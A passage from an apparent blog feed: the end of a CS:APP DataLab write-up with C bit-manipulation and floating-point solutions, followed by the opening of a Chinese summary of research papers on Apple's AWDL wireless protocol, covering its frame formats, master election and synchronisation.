+ 2</em>d + 1*e (a,b,c,d,e = 0 or 1)$$<br>依次求出abcde即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class="line"><span class="comment"> *   Example: ilog2(16) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 90</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, l, m;</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// i = 0x55555555</span></span><br><span class="line">    i = <span class="number">0x55</span> | (<span class="number">0x55</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    i = i | (i &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// j = 0x33333333</span></span><br><span class="line">    j = <span class="number">0x33</span> | (<span class="number">0x33</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    j = j | (j &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// k = 0x0f0f0f0f</span></span><br><span class="line">    k = <span class="number">0x0f</span> | (<span class="number">0x0f</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    k = k | (k &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// l = 0x00ff00ff</span></span><br><span class="line">    l = <span class="number">0xff</span> | (<span class="number">0xff</span> &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// m = 0x0000ffff</span></span><br><span class="line">    m = <span class="number">0xff</span> | (<span class="number">0xff</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    x = (x &amp; i) + ((x &gt;&gt; <span class="number">1</span>) &amp; i);</span><br><span class="line">    x = (x &amp; j) + ((x &gt;&gt; <span class="number">2</span>) &amp; j);</span><br><span class="line">    x = (x &amp; k) + ((x &gt;&gt; <span class="number">4</span>) &amp; k);</span><br><span class="line">    x = (x &amp; l) + ((x &gt;&gt; <span class="number">8</span>) &amp; l);</span><br><span class="line">    x = (x &amp; m) + ((x &gt;&gt; <span class="number">16</span>) &amp; m);</span><br><span class="line">    x = x + ~<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Floating-Point-Operations"><a href="#Floating-Point-Operations" class="headerlink" title="Floating-Point Operations"></a>Floating-Point Operations</h1><h2 id="float-neg"><a href="#float-neg" class="headerlink" title="float_neg"></a>float_neg</h2><p>返回uf的相反数，如果uf是NaN则返回自身。允许使用条件与循环语句。允许使用任何int与unsigned操作符。最大操作符数量为10，等级为2。</p><p>可以直接修改符号位返回相反数。另外如果uf的指数位为0xff并且小数位非0时，uf为NaN，因此就需要判断uf的绝对值是否大于0x7f800000。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mask = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">if</span> ((uf &amp; ~mask) &gt; (<span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>))</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">return</span> uf ^ mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h2><p>将一个整数转换为浮点数表示的形式。允许使用条件与循环语句，允许使用任何int和unsigned操作符。。最大操作符数量为30，等级为4。</p><p>浮点数的表示主要有三个部分：符号位sign，指数位exp和小数位frac。首先找到符号位后将x取绝对值(符号位归0)，通过右移找到x最高位的1的位置(找到x的2的最高次方)再加127就得到指数位exp，之后就需要计算小数位frac，由于int有31位，而浮点数小数位只有23位存放数据，因此从int转为float会丢失8位的精度，这时就需要对小数位向偶数舍入。int类型中有两个特殊值：0和0x80000000，这两个特殊值不能通过移位计算指数位与小数位因此要单独处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class="line"><span class="comment"> *   Result is returned as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sign, <span class="built_in">exp</span>, frac, bitc, tailb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0x80000000</span>) <span class="keyword">return</span> <span class="number">0xCF000000</span>;</span><br><span class="line"></span><br><span class="line">    sign = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">if</span> (sign) x = -x;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// count bits to the right of MSB</span></span><br><span class="line">    bitc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((x &gt;&gt; bitc) != <span class="number">0</span>)</span><br><span class="line">        bitc++;</span><br><span class="line">    bitc--;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exp</span> = bitc + <span class="number">127</span>;</span><br><span class="line"></span><br><span class="line">    x = x &lt;&lt; (<span class="number">31</span> - bitc); <span class="comment">// clear all those zeros to the left of MSB</span></span><br><span class="line">    frac = (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x7FFFFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// round to even (nearest)</span></span><br><span class="line">    <span class="keyword">if</span> (bitc &gt; <span class="number">23</span>) &#123;</span><br><span class="line">        tailb = x &amp; <span class="number">0xFF</span>; <span class="comment">// byte to round</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((tailb &gt; <span class="number">128</span>) || ((tailb == <span class="number">128</span>) &amp;&amp; (frac &amp; <span class="number">1</span>))) &#123;</span><br><span class="line">            frac += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (frac &gt;&gt; <span class="number">23</span>) &#123;</span><br><span class="line">                <span class="built_in">exp</span> += <span class="number">1</span>;</span><br><span class="line">                frac = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (sign &lt;&lt; <span class="number">31</span>) | (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="float-twice"><a href="#float-twice" class="headerlink" title="float_twice"></a>float_twice</h2><p>返回浮点数uf乘2的结果，如果uf为NaN则返回自身。允许使用条件与循环语句，允许使用任何int和unsigned操作符。最大操作符数量为30，等级为4。</p><p>浮点数乘2其实就是将exp加1，但是需要单独处理一些特殊情况，例如NaN，正负0(0x0, 0x80000000)和非规格化的浮点数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mask = (<span class="number">0x1</span> &lt;&lt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((uf &amp; ~mask) &gt;= (<span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>))</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((uf &amp; (<span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> (uf &amp; ~(<span class="number">0x1FF</span> &lt;&lt; <span class="number">23</span>)) &lt;&lt; <span class="number">1</span> | (uf &amp; mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> uf + (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CS:APP DataLab WriteUp.</summary>
    
    
    
    <category term="CSAPP" scheme="https://srpopty.github.io/categories/CSAPP/"/>
    
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>AWDL协议及漏洞分析</title>
    <link href="https://srpopty.github.io/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://srpopty.github.io/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-08-11T06:54:10.000Z</published>
    <updated>2020-09-23T02:51:43.974Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Milan Stute, David Kreitschmann, and Matthias Hollick. One Billion Apples’ Secret Sauce: Recipe for the Apple Wireless Direct Link Ad hoc Protocol. The 24th Annual International Conference on Mobile Computing and Networking (MobiCom ’18), October 29–November 2, 2018, New Delhi, India. ACM. Best Community Paper Award. doi:10.1145/3241539.3241566</p></blockquote><blockquote><p>Milan Stute, Sashank Narain, Alex Mariotto, Alexander Heinrich, David Kreitschmann, Guevara Noubir, and Matthias Hollick. A Billion Open Interfaces for Eve and Mallory: MitM, DoS, and Tracking Attacks on iOS and macOS Through Apple Wireless Direct Link. 28th USENIX Security Symposium (USENIX Security ’19), August 14–16, 2019, Santa Clara, CA, USA.</p></blockquote><blockquote><p>本文章主要涉及以上两篇论文的总结与归纳，其中第一篇论文作者主要通过逆向对AWDL协议进行分析与测试，第二篇论文作者通过对ADWL进行安全性分析，发现了四个高危漏洞。另外本文章主要关注于AWDL协议与其漏洞内容，不涉及讨论对AWDL协议具体的逆向过程与效率分析结果。</p></blockquote><h1 id="背景简介"><a href="#背景简介" class="headerlink" title="背景简介"></a>背景简介</h1><p>基于苹果无线直连(Apple Wireless Direct Link, AWDL)协议的AirDrop与AirPlay广泛在苹果生态中的操作系统里使用，包括iOS，MacOS，WatchOS等等。通过AWDL协议使得数十亿不同的苹果设备之间可以无需连接无线接入点就很方便的互相传递信息。随着AWDL协议的广泛使用，该协议也牵涉很多用户的隐私，因此协议安全性是至关重要的，原论文作者首次对AWDL协议与其低功耗蓝牙(Bluetooth Low Energy, BLE)集成进行安全性分析与代码逆向，通过分析逆向结果，作者发现了一些不同类型的安全漏洞：</p><ol><li>设备长期跟踪，使得MAC地址随机化无效，可能会泄露设备所有者的个人信息。</li><li>针对与AWDL协议机制，通过去同步目标的信道从而阻止目标设备通信，形成DOS攻击。</li><li>可造成中间人攻击，篡改通过AirDrop发送的文件。</li><li>对WIFI驱动中的AWDL协议可以进行两次DOS攻击，该DOS攻击可以针对单一目标设备或者周围所有设备。</li></ol><p>作者针对以上四个安全漏洞制作了POC，并且演示了通过20$的micro:bit设备与无线网卡即可实施攻击。</p><h1 id="AWDL协议"><a href="#AWDL协议" class="headerlink" title="AWDL协议"></a>AWDL协议</h1><p>苹果无线直连(Apple Wireless Direct Link, AWDL)协议是基于IEEE 802.11标准的苹果公司专利无线AD-Hoc(点对点)通讯协议，苹果公司于2014年首次将该协议整合进包括iPhone与Mac的产品线中，具体实现体现在AirDrop与AirPlay等应用中，无需连接AP，可以很方便的实现信息点对点跨设备传输。原论文作者在2018年首次对该协议进行逆向，通过代码静态分析与运行时分析解析该协议框架内容与帧格式，编写了可以解析AWDL帧的WireShark解析器。</p><h2 id="帧类型与结构"><a href="#帧类型与结构" class="headerlink" title="帧类型与结构"></a>帧类型与结构</h2><p>AWDL协议主要有两种帧：动作帧(Action Frame, AF)与数据帧(Data Frame, DF)，其中动作帧主要用于网络节点同步，主节点选举等，数据帧主要用于数据的传输。</p><h3 id="动作帧"><a href="#动作帧" class="headerlink" title="动作帧"></a>动作帧</h3><p>动作帧(Action Frame)的帧结构如图所示，动作帧基于802.11的基础帧结构的扩展，除了802.11的基础帧结构，额外由一个固定长度的报头与多个TLV字段构成。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/af.jpg"></p><p>动作帧中各字段解释如下表所示</p><table><thead><tr><th>字段</th><th>长度(Byte)</th><th>说明</th></tr></thead><tbody><tr><td>Type/Subtype</td><td>2</td><td>指定该802.11帧的类型或子类型</td></tr><tr><td>Duration</td><td>2</td><td>恒为0，表示预计占用信道的时间</td></tr><tr><td>Destination Address</td><td>6</td><td>接收该帧的目的MAC地址</td></tr><tr><td>Source Address</td><td>6</td><td>发送该帧的源MAC地址</td></tr><tr><td>BSSID</td><td>6</td><td>AP的MAC地址，这里表示集群中主节点的地址，在AWDL协议中恒为00:25:00:ff:94:73</td></tr><tr><td>Sequence/Fragment no.</td><td>2</td><td>帧序列号与帧片段编号</td></tr><tr><td>Cat.</td><td>1</td><td>作者未解释，在AWDL协议中恒为0x7f</td></tr><tr><td>OUI</td><td>3</td><td>组织唯一标识符(Organization Unique Identifier, OUI)，由芯片供应商提供，苹果公司分配到的为00:17:f2</td></tr><tr><td>Type</td><td>1</td><td>恒为8</td></tr><tr><td>Version</td><td>1</td><td>该动作帧的版本，目前为1.0</td></tr><tr><td>Subtype</td><td>1</td><td>动作帧的子类型，包含周期同步帧(0)和主指标广播帧(3)</td></tr><tr><td>Reversed</td><td>1</td><td>保留位，恒为0</td></tr><tr><td>Phy Tx Time</td><td>4</td><td>用于同步的时间戳，表示该帧的创建时间</td></tr><tr><td>Target Tx Time</td><td>4</td><td>用于同步的时间戳，表示该帧进入传输队列的时间</td></tr><tr><td>TLVs</td><td>&gt;4</td><td>TLV里包含了动作帧的控制信息，一个动作帧后会附着若干个TLV字段，该字段由1字节type子字段与2字节length子字段，length子字段代表后续的value子字段长度</td></tr></tbody></table><hr><p>动作帧分为两种子类型，由Subtype字段指示</p><ul><li>周期同步帧(Periodic Synchronization Frame, PSF)：Subtype字段为0，主要用于设备之间的同步。</li><li>主指标广播(Broadcast Master Indication Frame, MIF)：Subtype字段为3，用于主节点选举或服务发现。</li></ul><p>动作帧主要通过若干个TLV字段来传递控制信息，TLV可用于选举，同步，服务发现和用户数据传输。部分常用TLV的说明如下表所示，各TLV的名称来源作者静态分析的结果。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/tlv.jpg"></p><p>Version TLV中提供的版本号将会替换掉动作帧字段中的Version字段。Version TLV包含了AWDL的版本和设备ID，设备ID用以对操作系统进行区分，macOS 10.13和ios 11使用v3版本，macOS 10.12和ios 10使用v2版本，macOS 10.11使用了v1版本。</p><h3 id="数据帧"><a href="#数据帧" class="headerlink" title="数据帧"></a>数据帧</h3><p>AWDL使用802.11的数据帧进行用户数据传输。其帧结构如下图所示。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/df.jpg"></p><p>DSAP字段之前的各字段与动作帧中的字段含义相同，其余各字段解释如下</p><table><thead><tr><th>字段</th><th>长度(Byte)</th><th>说明</th></tr></thead><tbody><tr><td>DSAP</td><td>1</td><td>目标服务访问点，恒为0xaa</td></tr><tr><td>SSAP</td><td>1</td><td>源服务访问点，恒为0xaa</td></tr><tr><td>Ctrl</td><td>1</td><td>控制位，恒为0x03</td></tr><tr><td>OUI</td><td>3</td><td>与动作帧相同，恒为00:17:f2</td></tr><tr><td>Protocol ID</td><td>2</td><td>协议ID，恒为0x0800</td></tr><tr><td>Magic Byte</td><td>2</td><td>魔术字节，恒为0x0304</td></tr><tr><td>Sequence Number</td><td>2</td><td>数据帧序列号</td></tr><tr><td>Protocol ID</td><td>2</td><td>与动作帧相同，恒为00:17:f2</td></tr><tr><td>Reversed</td><td>2</td><td>保留位，恒为0</td></tr><tr><td>EtherType</td><td>2</td><td>以太网协议类型，恒为0x86dd，代表使用IPV6协议</td></tr></tbody></table><h2 id="节点寻址"><a href="#节点寻址" class="headerlink" title="节点寻址"></a>节点寻址</h2><p>苹果使用MAC地址随机化以保护用户隐私，每次接口被激活时将会生成一个随机的MAC地址。AWDL协议为了在网络集群中确定一个节点的IPV6地址需要使用网络层的协议解决，苹果采用了RFC 4291[19, Appendix A]中的算法使用动作帧中的源MAC地址生成本地IPV6地址。简单来说，对于一个给定的MAC地址<code>u:v:w:x:y:z</code>，生成的IPV6地址为<code>fe:80::u^0x02:v:w:ff::fe:x:y:z</code>。当一个节点收到了第一个动作帧以后就可以根据该帧中的源地址计算出源地址的IPV6地址并且将其加入的地址表中，无需使用其他地址解析协议。</p><h2 id="协议内容"><a href="#协议内容" class="headerlink" title="协议内容"></a>协议内容</h2><p>简而言之，每个AWDL集群中的节点都会定期广播一系列包含自己可用窗口(Availability Window, AW)的动作帧以表示该节点可与其他节点进行通信，之后集群中将会选举出一个主节点，该主节点的作用是使集群中的其他节点保持同步，此外AWDL协议还可以使用信道跳变将AP调整到其他信道同时与其他节点进行通信，AWDL还能够处理集群的节点随时退出。</p><h3 id="主节点选举"><a href="#主节点选举" class="headerlink" title="主节点选举"></a>主节点选举</h3><p>主节点在集群中是唯一的，其作用就是使集群中所有的从节点保持时钟同步，主节点广播其时钟信号，从节点收到信号后同步自己的时钟。此外由于集群网络中主节点到某从节点之间可能无法直接到达，需要经过多个从节点，因此该路径上的从节点将临时扮演主节点，称为“非选举主节点”，重复主节点发出的时钟信号，此外，非选举主节点将使用Synchronization Tree TLV宣布自己到主节点之间的路径。</p><p>一个集群可以抽象为一个无向树，当非选举主节点传递时钟信号时可能会在树中遇到环，从而发生传递死循环，如下图所示，主节点的目标是同步Node4，但是Node4还通向Node3，因此Node1到Node4将轮流作为非选举主节点向相邻的Node同步，造成循环。为了解决这个问题，每个动作帧中都包含一个Synchronization Tree TLV，其中保存了所有节点到主节点的列表，如果一个节点发现自己已经在通往目标节点的路径上时将拒接接收非选举主节点的时钟信号，例如Node3已经由Node1同步，但是发现自己位于通向Node4的路径上，因为来自Node1的同步信号将早于来自Node4的同步信号，因此将会拒绝接收来自Node4的同步。<br><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/c.jpg"></p><p>每个激活了AWDL接口的集群节点将会使用Election Parameters v2 TLV广播其主指标，集群中主指标最大的节点将被选举为主节点。主指标是一个度量值，苹果在其专利中宣称该值的选择取决于设备电量，CPU负载，信号强度等因素，但是原论文作者在测试时发现这个度量值只是随机选择的。</p><p>选举的具体操作为：激活了AWDL接口的节点将主指标初始值设置为60进行广播（使用一个很小的初始值60是为了避免当一个新节点加入集群中时整个集群重新进行选举），之后该节点监听主节点信道2秒，如果没有发现集群中存在主节点，那么该节点将会从指定的范围中随机选取一个随机数，对于v2版本，该范围为405到436，对于v3版本，该范围为505到536，随着版本增加随机数范围的增加可以保证集群中被选举出的主节点都是最新版本的，并且可以向后兼容。此外，原论文作者在测试时发现每个节点不管集群中是否已经存在了一个主节点，只在很短的时间里维护自己的主指标，之后便从范围中选取一个更高的随机数作为新的主指标，除了主指标节点还会维护一个计数器，该计数器的作用就是实现选取更高的随机数(主指标=随机数+计数器)，并且该计数器的值将会随着主节点选举结束后随时间线性增长，这表明一个已经存在的主节点可能会被另一个运行相同版本AWDL的节点替换掉。</p><p>当两个不同的集群相互接近时，AWDL会对这两个集群进行合并，由于所有的节点都使用Election Parameters TLV广播主指标，当一个集群中的主节点发现另一个集群的主节点发送的主指标时，主指标更高的主节点将会成为集群合并后的主节点。</p><p>当主节点离开集群后，由于主节点不会再继续主动发送动作帧以保持集群同步，因此其他节点会经过一定的超时时间后（96个可用窗口时间，大约1.5秒）检测到丢失主节点，这时集群会进行重新选举，另一个节点将会取代原来的主节点，由于该节点已经与原来的主节点同步过，所以整个其他从节点无需再次同步，只需修改自己帧里面的主节点地址即可，可以实现主节点离群后重新选举的无缝衔接。</p><h3 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h3><p>在选举出主节点的集群中，每一个从节点都将与主节点进行时间同步。AWDL中存在可用窗口作为时间同步的最小划分。可用窗口(Availability Window, AW)表示设备可以进行通信的一段固定时间，AWDL协议基于单位时间(Time Unit, TU)计时，1TU=1024 μs，而每一个AW的时长为16TU，该值使用Synchronization Parameters TLV进行传递。为了降低性能功耗，节点不会监听每一个AW，而是以4个窗口为一个监听周期，第一个窗口为AW，后三个窗口被称为扩展窗口(Extension Window，EW)，EW的长度与AW相同。在AWDL中允许在一个周期中配置不同数量的EW，但是原论文作者在逆向时发现该值恒为3。因此一个节点的最小监听周期为4个连续的AW/EW，称为扩展可用窗口(Extended Availability Window, EAW)，即<code>1 EAW = AW + 3EW = 64 TU</code>。</p><p>为了进行同步，主节点需要在每个同步动作帧中宣布主节点下一个可用窗口的起始，主节点在动作帧里包含当前的AW或EW的序列号$i (0&lt;=i&lt;2^(16))$，以及当前AW(或EW)到下一个EAW的单位时间TU的数量$t_(AW)$，如下图所示，在第40个AW结束，第41个EW开始时主节点发送同步动作帧，这时当前AW/EW的序列号为41，距离下一个EAW开始还需要<code>3*16=48 TU</code>。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/eaw.jpg"></p><p>同步的目的就是使集群中所有的从节点都采用和主节点一样的时间进度，主节点距离下一个EAW还需要多少时间，所有从节点也需要知道这个时间才能达到同步，因此当一个从节点在$T_(Rx)$时间收到来自主节点的同步帧后，计算当前时间点到下一个主节点AW的时间间隔$T_(AW)$的公式如下，在该公式中$t_(air)$代表使用WiFi在空气中的传输时间，在实际计算时该值会被忽略，在近距离传播的环境下误差大概为3 ms。<br>$$T_(AW)=t_(AW)*1024-(T_(TxPhy)-T_(TxTarget))+t_(air)+T_(Rx)$$</p><h3 id="信道序列"><a href="#信道序列" class="headerlink" title="信道序列"></a>信道序列</h3><p>当所有节点的AW同步后，所有节点就处于同一个AW下，准备进行通信，这时就需要指示节点使用哪个信道进行通信并且将信道序列进行对齐以保证两个节点之间可以同时使用该信道通信。AWDL常用的社交信道为44，6，149或0，其中0代表节点没有监听任何信道。AWDL将AW序列号与可用的信道序列进行映射，节点使用Synchronization Parameters TLV传输目前可用的信道序列，该TLV的格式如下图所示。<br><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/spt.jpg"></p><p>传输的信道序列的个数c+1固定为16，但是类似于AW，信道序列可以使用step字段进行延长(AW中的step为3，为一个EAW扩展了3个EW)，原论文逆向发现该step恒为3，表示一个信道的使用时间将持续4个AW或者1个EAW，如下图所示。<br><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/channel.jpg"></p><p>当一个节点收到来自主节点的信道序列以及当前AW序列号后可以使用如下的公式计算(映射)出当前AW需要使用信道C。<br>$$C=i mod ((c+1)*(step+1))$$</p><p>由于AWDL协议中c与step都是恒定值，所以<code>(c+1)*(step+1) = 64 AW</code>，而<code>64 AW * 16TU/AW = 1048576 μs ≈ 1 s</code>，即每个信道大约持续1s后跳变。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>原论文作者使用C实现了一份与AWDL协议等价的开源协议<a href="https://github.com/seemoo-lab/owl">OWL</a>，该协议可以运行在Linux和macOS上。</li><li>原论文作者提供了一个可以用于分析AWDL协议帧的<a href="https://github.com/seemoo-lab/wireshark-awdl">WireShark分析器</a></li><li>原论文作者使用Python实现了与AirDrop等价的开源程序<a href="https://github.com/seemoo-lab/opendrop">OpenDrop</a></li></ul><h1 id="AirDrop分析"><a href="#AirDrop分析" class="headerlink" 